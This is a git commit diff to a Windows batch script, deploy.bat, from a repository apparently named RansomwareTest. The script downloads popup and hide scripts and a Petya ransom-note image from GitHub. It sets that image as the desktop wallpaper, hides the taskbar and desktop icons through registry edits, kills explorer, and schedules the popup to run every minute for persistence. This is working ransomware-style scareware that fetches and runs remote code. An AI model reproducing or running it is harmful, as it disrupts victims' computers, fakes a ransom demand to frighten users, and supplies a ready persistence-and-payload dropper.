b376dbc7bd68dc532543d6a7372b9b61cf134806
git-TGMB <133995763+git-TGMB@users.noreply.github.com>
2024-03-12 12:41:12 -0500

    Update deploy.bat

--- deploy.bat
+++ deploy.bat
@@ -1,22 +1,22 @@
 set "TaskName=PopupTask"
-set "url=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/popup.bat"
+set "url1=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/popup.bat"
+set "url2=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/hide.bat"
 set "wallpaperurl=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/petya-ransom-note.jpg"
 set "wallpaperpath=C:\temp\petya-ransom-note.jpg"
-set "ScriptPath=C:\temp\popup.bat"
-
-:: Block user input
-:: powershell -WindowStyle Hidden -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{F24}')"
+set "Script1=C:\temp\hide.bat"
+set "Script2=C:\temp\popup.bat"
 
 :: persistence
-curl -L -o "%ScriptPath%" "%url%"
+curl -L -o %Script1% %url1%
+curl -L -o %Script2% %url2%
 curl -L -o %wallpaperpath% %wallpaperurl%
-
-:: Hide taskbar
-powershell -WindowStyle Hidden -Command "&{$p = (New-Object -ComObject Shell.Application).Windows() | Where-Object {$_.Name -eq 'Taskbar'}; $p.Visible = 0}"
 
 :: Change wallpaper
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %wallpaperpath% /f
-RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+::RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+:: Hide taskbar
+powershell -command "&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}"
 
 :: Hide desktop icons
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f
@@ -24,5 +24,5 @@ taskkill /f /im explorer.exe
 start explorer.exe
 
 :: schtask for popup.bat
-schtasks /Create /TN "%TaskName%" /TR "%ScriptPath%" /SC MINUTE /MO 1 /RL LIMITED /F
+schtasks /Create /TN "%TaskName%" /TR "%Script2%" /SC MINUTE /MO 1 /RL LIMITED /F
 schtasks /Run /TN %TaskName%
